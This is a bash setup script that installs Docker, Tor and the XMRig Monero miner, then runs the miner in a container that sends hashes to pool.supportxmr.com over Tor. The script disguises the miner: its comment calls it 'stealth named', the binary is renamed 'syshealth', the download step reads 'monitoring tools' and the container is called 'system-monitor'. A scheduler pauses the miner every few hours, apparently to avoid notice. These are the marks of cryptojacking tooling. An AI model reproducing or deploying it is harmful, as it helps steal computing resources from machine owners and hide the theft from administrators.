#!/bin/bash
# Setup script - Run after cloning: sudo ./setup.sh <WALLET>
# Installs EVERYTHING: Docker, Tor (inside container), MSR module, XMRig
# Uses Tor for anonymity (no VPN credentials needed)

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'



# Parse arguments
WALLET="$1"
CPU_PCT="$2"


# Default CPU percent to 100 if not provided
if [ -z "$CPU_PCT" ]; then
    CPU_PCT=100
fi

# Validate arguments
if [ -z "$WALLET" ]; then
    echo -e "${RED}Usage: sudo ./setup.sh <WALLET>${NC}"
    echo -e "${RED}Example: sudo ./setup.sh 49J8k2f3...${NC}"
    exit 1
fi

# Always generate a unique worker name for each run (shows up in supportxmr dashboard)
HOST_CLEAN=$(hostname | tr -cd 'a-zA-Z0-9' | head -c 12)
RAND_SUFFIX=$(head -c 100 /dev/urandom | tr -dc 'a-z0-9' | head -c 6)
RIGID="${HOST_CLEAN}-${RAND_SUFFIX}"

# Validate CPU percent is an integer between 1 and 100
if ! [[ "$CPU_PCT" =~ ^[0-9]+$ ]] || [ "$CPU_PCT" -lt 1 ] || [ "$CPU_PCT" -gt 100 ]; then
    echo -e "${RED}Invalid CPU percent: ${CPU_PCT}. Must be integer 1-100.${NC}"
    exit 1
fi

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}Please run as root: sudo ./setup.sh <WALLET>${NC}"
    exit 1
fi

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "${SCRIPT_DIR}"

echo -e "${GREEN}╔════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║  System Utilities Setup (Tor Edition)  ║${NC}"
echo -e "${GREEN}╚════════════════════════════════════════╝${NC}"
echo ""

# ============================================
# STEP 1: Install ALL prerequisites
# ============================================
echo -e "${GREEN}[1/6] Installing prerequisites...${NC}"

if command -v apt-get &> /dev/null; then
    export DEBIAN_FRONTEND=noninteractive
    apt-get update -qq
    apt-get install -y -qq curl git ca-certificates gnupg wget tar gzip kmod
elif command -v yum &> /dev/null; then
    yum install -y curl git ca-certificates wget tar gzip kmod
elif command -v dnf &> /dev/null; then
    dnf install -y curl git ca-certificates wget tar gzip kmod
elif command -v pacman &> /dev/null; then
    pacman -Sy --noconfirm curl git ca-certificates wget tar gzip kmod
elif command -v apk &> /dev/null; then
    apk add --no-cache curl git ca-certificates wget tar gzip kmod
else
    echo -e "${YELLOW}[!] Unknown package manager, assuming deps are installed${NC}"
fi

# ============================================
# STEP 2: Load MSR kernel module for better hashrate
# ============================================
echo -e "${GREEN}[2/6] Loading MSR kernel module...${NC}"
modprobe msr 2>/dev/null || echo -e "${YELLOW}[!] MSR module not available (VM?)${NC}"

# ============================================
# STEP 3: Install Docker if not present
# ============================================
echo -e "${GREEN}[3/6] Setting up Docker...${NC}"
if ! command -v docker &> /dev/null; then
    echo -e "${GREEN}    Installing Docker...${NC}"
    curl -fsSL https://get.docker.com | sh
    systemctl enable docker 2>/dev/null || true
    systemctl start docker 2>/dev/null || true
else
    echo -e "${GREEN}    Docker already installed${NC}"
fi

# Ensure docker is running
if ! docker info &> /dev/null; then
    systemctl start docker 2>/dev/null || service docker start 2>/dev/null || true
    sleep 3
fi

# ============================================
# STEP 4: Download XMRig binary (stealth named)
# ============================================
echo -e "${GREEN}[4/6] Downloading monitoring tools...${NC}"
if [ ! -f "${SCRIPT_DIR}/syshealth" ]; then
    XMRIG_VERSION="6.21.0"
    wget -q --show-progress "https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-linux-static-x64.tar.gz" -O /tmp/xmrig.tar.gz
    tar -xzf /tmp/xmrig.tar.gz -C /tmp
    mv "/tmp/xmrig-${XMRIG_VERSION}/xmrig" "${SCRIPT_DIR}/syshealth"
    chmod +x "${SCRIPT_DIR}/syshealth"
    rm -rf /tmp/xmrig*
    echo -e "${GREEN}    Downloaded and renamed to syshealth${NC}"
else
    echo -e "${GREEN}    Already downloaded${NC}"
fi

# ============================================
# STEP 5: Generate config files
# ============================================
echo -e "${GREEN}[5/6] Generating configuration...${NC}"

mkdir -p config scripts

# Generate preferences.json with wallet, Tor proxy, and 0% donation
cat > config/preferences.json << PREFS
{
    "autosave": false,
    "background": false,
    "colors": false,
    "title": true,
    "randomx": {
        "init": -1,
        "init-avx2": -1,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true,
        "scratchpad_prefetch_mode": 1
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": false,
        "hw-aes": null,
        "priority": null,
        "memory-pool": false,
        "yield": true,
        "max-threads-hint": ${CPU_PCT},
        "asm": true,
        "argon2-impl": null
    },
    "log-file": null,
    "donate-level": 0,
    "donate-over-proxy": 0,
    "pools": [
        {
            "algo": "rx/0",
            "coin": null,
            "url": "pool.supportxmr.com:3333",
            "user": "${WALLET}",
            "pass": "x",
            "rig-id": "${RIGID}",
            "nicehash": false,
            "keepalive": true,
            "enabled": true,
            "tls": false,
            "daemon": false,
            "socks5": "127.0.0.1:9050"
        },
        {
            "algo": "rx/0",
            "coin": null,
            "url": "pool.supportxmr.com:443",
            "user": "${WALLET}",
            "pass": "x",
            "rig-id": "${RIGID}",
            "nicehash": false,
            "keepalive": true,
            "enabled": true,
            "tls": true,
            "daemon": false,
            "socks5": "127.0.0.1:9050"
        }
    ],
    "retries": 5,
    "retry-pause": 5,
    "print-time": 0,
    "health-print-time": 0,
    "dmi": false,
    "syslog": false,
    "verbose": 0,
    "watch": false,
    "pause-on-battery": false,
    "pause-on-active": false
}
PREFS

# Generate network.sh (Tor setup)
cat > scripts/network.sh << 'NETWORK'
#!/bin/bash
# Tor Network Setup

MAX_RETRIES=5
RETRY_COUNT=0

start_tor() {
    echo "[*] Starting Tor..."
    
    mkdir -p /tmp/tor_data
    chmod 700 /tmp/tor_data
    
    cat > /tmp/torrc << 'EOF'
SocksPort 9050
SocksPolicy accept 127.0.0.1
RunAsDaemon 1
DataDirectory /tmp/tor_data
Log notice file /tmp/tor.log
EOF

    tor -f /tmp/torrc
    
    for i in $(seq 1 60); do
        sleep 2
        if grep -q "Bootstrapped 100%" /tmp/tor.log 2>/dev/null; then
            echo "[+] Tor connected successfully!"
            return 0
        fi
        if grep -q "Bootstrapped" /tmp/tor.log 2>/dev/null; then
            PROGRESS=$(grep "Bootstrapped" /tmp/tor.log | tail -1)
            echo "[*] $PROGRESS"
        fi
    done
    return 1
}

check_tor() {
    if curl -s --socks5 127.0.0.1:9050 --max-time 10 https://check.torproject.org/api/ip 2>/dev/null | grep -q '"IsTor":true'; then
        return 0
    fi
    return 1
}

while [ $RETRY_COUNT -lt $MAX_RETRIES ]; do
    if start_tor && check_tor; then
        TOR_IP=$(curl -s --socks5 127.0.0.1:9050 https://check.torproject.org/api/ip 2>/dev/null | grep -oP '"IP":"\K[^"]+')
        echo "[+] Tor exit IP: ${TOR_IP}"
        exit 0
    fi
    
    RETRY_COUNT=$((RETRY_COUNT + 1))
    echo "[!] Tor connection failed, retry ${RETRY_COUNT}/${MAX_RETRIES}..."
    pkill tor 2>/dev/null || true
    sleep 5
done

echo "[!] Failed to connect to Tor after ${MAX_RETRIES} attempts"
exit 1
NETWORK

# Generate scheduler.sh (with random CPU 40/60/75%)
cat > scripts/scheduler.sh << 'SCHEDULER'
#!/bin/bash
UTIL_DIR="/opt/utilities"
BIN="${UTIL_DIR}/syshealth"
CONFIG="${UTIL_DIR}/config/preferences.json"
PID_FILE="/var/run/syshealth.pid"

# Run 1-3 hours, pause 5 minutes
MIN_RUN_TIME=3600
MAX_RUN_TIME=10800
PAUSE_TIME=300

start_service() {
    "${BIN}" --config="${CONFIG}" --no-color &
    echo $! > "${PID_FILE}"
}

stop_service() {
    if [ -f "${PID_FILE}" ]; then
        kill $(cat "${PID_FILE}") 2>/dev/null
        rm -f "${PID_FILE}"
    fi
    pkill -f syshealth 2>/dev/null || true
}

check_network() {
    if ! pgrep -x tor > /dev/null 2>&1; then
        echo "[!] Tor not running, restarting..."
        stop_service
        bash "${UTIL_DIR}/scripts/network.sh" || true
    fi
}

get_random_runtime() {
    local range=$((MAX_RUN_TIME - MIN_RUN_TIME))
    local random_offset=$((RANDOM * RANDOM % range))
    echo $((MIN_RUN_TIME + random_offset))
}

while true; do
    check_network
    start_service
    RUNTIME=$(get_random_runtime)
    echo "[*] Running for $((RUNTIME/3600))h $((RUNTIME%3600/60))m at CPU_PERCENT_PLACEHOLDER CPU"
    ELAPSED=0
    while [ $ELAPSED -lt $RUNTIME ]; do
        sleep 300
        ELAPSED=$((ELAPSED + 300))
        check_network
    done
    stop_service
    echo "[*] Pausing for ${PAUSE_TIME}s..."
    sleep ${PAUSE_TIME}
done
SCHEDULER
# Replace placeholder with actual CPU percentage
sed -i "s/CPU_PERCENT_PLACEHOLDER/${CPU_PCT}/g" scripts/scheduler.sh

# Generate setup.sh for inside container
cat > scripts/setup.sh << 'INNERSETUP'
#!/bin/bash
UTIL_DIR="/opt/utilities"
BINARY_URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz"

if [ ! -f "${UTIL_DIR}/syshealth" ]; then
    echo "[*] Downloading utilities..."
    wget -q "${BINARY_URL}" -O /tmp/util.tar.gz
    tar -xzf /tmp/util.tar.gz -C /tmp
    mv /tmp/xmrig-*/xmrig "${UTIL_DIR}/syshealth"
    chmod +x "${UTIL_DIR}/syshealth"
    rm -rf /tmp/util.tar.gz /tmp/xmrig-*
fi
INNERSETUP

chmod +x scripts/*.sh

echo -e "${GREEN}    Config generated with wallet: ${WALLET:0:16}...${NC}"
echo -e "${GREEN}    Donation: 0%${NC}"
echo -e "${GREEN}    CPU: ${CPU_PCT}%${NC}"

# ============================================
# STEP 6: Build and start container
# ============================================
echo -e "${GREEN}[6/6] Building and starting container...${NC}"

# Stop any existing
docker compose down 2>/dev/null || true

# Build
docker compose build --quiet

# Start
docker compose up -d

echo ""
echo -e "${GREEN}╔════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║           Setup Complete!              ║${NC}"
echo -e "${GREEN}╚════════════════════════════════════════╝${NC}"
echo ""
echo -e "  ${GREEN}Wallet:${NC} ${WALLET:0:20}..."
echo -e "  ${GREEN}Pool:${NC} pool.supportxmr.com:3333"
echo -e "  ${GREEN}Network:${NC} Tor (anonymous)"
echo -e "  ${GREEN}Donation:${NC} 0%"
echo -e "  ${GREEN}CPU:${NC} ${CPU_PCT}%"
echo -e "  ${GREEN}Pause:${NC} 5 min every 3-5 hours"
echo ""
echo -e "  ${YELLOW}Commands:${NC}"
echo -e "    Check status:  docker exec system-monitor ps aux"
echo -e "    Check Tor IP:  docker exec system-monitor curl -s --socks5 127.0.0.1:9050 https://check.torproject.org/api/ip"
echo -e "    View logs:     docker logs system-monitor"
echo -e "    Stop:          docker compose down"
echo ""
